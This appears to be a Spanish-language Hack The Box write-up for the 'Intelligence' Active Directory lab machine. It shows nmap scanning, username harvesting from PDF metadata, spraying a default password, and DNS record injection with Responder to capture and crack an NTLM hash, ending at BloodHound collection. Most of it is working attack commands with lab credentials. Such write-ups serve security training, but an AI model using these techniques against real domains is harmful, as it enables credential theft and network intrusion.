
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.248`

```ad-done
53/tcp    
80/tcp    
88/tcp    
135/tcp   
139/tcp   
389/tcp   
445/tcp   
464/tcp   
593/tcp   
636/tcp   
3268/tcp  
3269/tcp  
9389/tcp  
49666/tcp 
49691/tcp 
49692/tcp 
49710/tcp 
49713/tcp 
49737/tcp 
```


`whatweb http://10.10.10.248 `
```ad-done
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```


`nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49691,49692,49710,49713,49737 -sCV 10.10.10.248 -oN targeted`

```ad-done
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec?
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-21T02:56:19+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  tcpwrapped
464/tcp   open  kpasswd5?
593/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
|_ssl-date: 2025-11-21T02:56:15+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
9389/tcp  open  tcpwrapped
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  tcpwrapped
49692/tcp open  tcpwrapped
49710/tcp open  unknown
49713/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  tcpwrapped

```


### 445
Como el puerto 445 esta abierto podemos saber mas sobre la maquina con [[CRACKMAPEXEC-NETEXEC]]
`netexec smb 10.10.10.248`
```ad-done
10.10.10.248 DC Windows10 Server2019(name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

Para hacer la enumeración del SMB usaremos:
```
netexec smb 10.10.10.248 --shares
smbclient -L 10.10.10.248 -N
smbmap -H 10.10.10.248
```

No se nos arroja nada de información por que es necesario tener credenciales

### 80

Encontramos un pdf que nos los descargamos y vemos los metadatos de este con [[EXIFTOOL]]
Encontramos que los creadores son
```ad-hint
Jose.Williams
William.Lee
```


Vemos que los documentos tienen una fecha así que vamos a crear un one linner en bash para ver si encontramos algún documento mas con fechas que podamos obtener
```bash
for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://intelligence.htb/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 5 wget
```

Una vez con todos loa documentos descargados les pasaremos el [[EXIFTOOL]]
```bash
exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u > users
```

Encontramos los siguientes ususarios
```ad-hint
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```


### Enumeración de usuarios validos del dominio con kerberos

`kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users`

Todo los usuarios se nos muestran como validos

Con todos los usuarios vamos a probar

### AS-REP ROAST ATACK

Solicitaremos los tikets TGT

`impacket-GetNPUsers intelligence.htb/ -no-pass -usersfile users `

Nos devuelve UF_DONT_REQUIRE_PREAUTH lo que quiere4 decir que no podemos obtener el hash y no son AS_REP ROASTEABLE

### PDFs

Usaremos la transformación de todo el pdf a texto con la herramienta [[pdftotext]]
```bash
for file in $(ls); do echo $file; done | grep -v users | while read filename; do pdftotext $filename; done
```


Encontramos el archivo `2020-06-04-upload.txt` con el siguiente contenido
```ad-hint
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

Nos indica una contraseña

### Correspondencia usuario a contraseña

Usaremos [[CRACKMAPEXEC-NETEXEC]] para probar la contraseña encontrada contra todos los ususarios
`netexec smb 10.10.10.248 -u users -p passwords`

Nos muestra que la contraseña pertenece al siguiente usuario
```ad-hint
Tiffany.Molina::NewIntelligenceCorpUser9876
```


### KERBEROASTING ATACK
Consiste en ir contra el TGS

Para hacerlo usaremos
`impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876`

Nos devuelve un mensaje de que no hay entradas validas lo que quiere decir que no es susceptible a este ataque


### RPC

Probamos a conectarnos con [[RPCCLIENT]] para ver si podemos enumerar el dominio
`rpcclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' 10.10.10.248`

- Enumeración de usuarios del dominio: `enumdomusers`

Como atacante lo que nos interesan son usuarios administradores del dominio, para ello enumeraremos los grupos del dominio
- Enumeración de grupos del dominio `enumdomgroups`
- Enumerar usuarios pertenecientes a un grupo `querygroupmem 0x200` pasándole el rid del grupo
- 
Nos mostrara el rid de un usuario pero este es el usuario Administrador
-  Enumerar usuario perteneciente `queryuser 0x1f4`

También podemos usar una herramienta automatizada para la enumeración
`git clone https://github.com/s4vitar/rpcenum.git`



### LDAP

Vamos a enumerar por LDAP con las credenciales validas que tenemos usando la herramienta [[LDAPDOMAINDUM]]
`ldapdomaindump -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -n 10.10.10.248 10.10.10.248`

Esto nos crea una web en localhost para poder ver la info del dominio


### SMB
 Vamos a enumerar recursos compartidos del usuario con credenciales que tenemos
 `smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'`

Para enumerar los recursos compartidos a los que tenemos acceso usaremos
`smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r Users`

`smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r Users/Tiffany.Molina`

` smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r Users/Tiffany.Molina/Desktop`

En el escritorio encontramos la primera flag

Seguiremos buscando en otros recursos compartidos
`smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r IT`

Encontramos aun archivo .ps1 asi que nos lo descargamos a nuestra maquina y vemos que contiene y que hace
`smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download IT/downdetector.ps1`

Al leer vemos que es una tarea que se ejecuta a intervalos regulares de tiempo


### DNSRECORD INJECTION


Usaremos el siguiente repositorio `https://github.com/dirkjanm/krbrelayx.git`

Lo que vamos a hacer es suplantar la petición dns que busca un sitio que empiece por web y que esa llamda con las credenciales las haga a nuestra propia maquina
`python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webjaime -a add -t A -d 10.10.14.30 10.10.10.248`


Ahora con el [[RESPONDER]] 
`responder -I tun0`

Estaremos interceptando el trafico, y ya sabiendo que la autenticación vienen hasta nuestra maquina, veremos un hash ntlm

Obtenemos el hash con un usuario llamado `Ted.Graves`

Con [[JOHN THE RIPPER]] lo crakeamos
`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

Y obtenemos el usuario y contraseña 
```ad-hint
Ted.Graves::Mr.Teddy
```


Comprobamos que las credenciales son las correctas
`netexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'`


### BLOODHOUND

Con la herramienta de [[BLOODHOUND]] recopilaremos toda la información necesaria de la maquina victima para después paseársela a este y buscar el método de escalada de privilegios.
`bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All`

Nos devuelve unos archivos .json y se los pasamos a [[BLOODHOUND]]

Buscamos por nuestros usuarios encontrados